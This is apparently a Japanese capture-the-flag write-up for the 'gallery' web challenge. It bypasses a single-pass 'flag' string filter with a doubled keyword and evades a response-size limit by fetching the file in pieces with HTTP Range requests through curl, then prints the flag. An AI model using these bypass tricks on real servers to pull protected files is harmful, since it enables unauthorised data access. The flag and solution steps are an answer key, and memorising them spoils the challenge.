# gallery

## 解法

handlers.go を確認すると flag が `replace_all` されていることに気付く

```go
fileExtension = strings.ReplaceAll(fileExtension, "flag", "")
```

replace_all されてもうまく flag が組立つようにクエリを作成

```
https://gallery.quals.beginners.seccon.jp/?file_extension=flflagag
```

すると `flag_7a96139e-71a2-4381-bf31-adf37df94c04.pdf` という pdf が出現する
しかし開くと`?`で埋め尽くされている。

配布されているプログラムを確認すると一定バイト以上を超えた場合 `?` で埋め尽くされたファイルが返されるプログラムになっている

```go
func (w *MyResponseWriter) Write(data []byte) (int, error) {
	filledVal := []byte("?")

	length := len(data)
	if length > w.lengthLimit {
		w.ResponseWriter.Write(bytes.Repeat(filledVal, length))
		return length, nil
	}

	w.ResponseWriter.Write(data[:length])
	return length, nil
}

func middleware() func(http.Handler) http.Handler {
	return func(h http.Handler) http.Handler {
		return http.HandlerFunc(func(rw http.ResponseWriter, r *http.Request) {
			h.ServeHTTP(&MyResponseWriter{
				ResponseWriter: rw,
				lengthLimit:    10240, // SUPER SECURE THRESHOLD
			}, r)
		})
	}
}
```

Range ヘッダーの存在を思い出す

**参考**
https://developer.mozilla.org/ja/docs/Web/HTTP/Headers/Range

10メガバイトずつ取り出してくっつける

```shell
curl -H "Range: bytes=0-10000" https://gallery.quals.beginners.seccon.jp/images/flag_7a96139e-71a2-4381-bf31-adf37df94c04.pdf -o 1.pd
curl -H "Range: bytes=10001-20000" https://gallery.quals.beginners.seccon.jp/images/flag_7a96139e-71a2-4381-bf31-adf37df94c04.pdf -o 2.pd
cat 1.pdf 2.pdf > 12.pdf
```

`12.pdf` を開くとフラグが表示された

## フラグ

```
ctf4b{r4nge_reque5t_1s_u5efu1!}
```

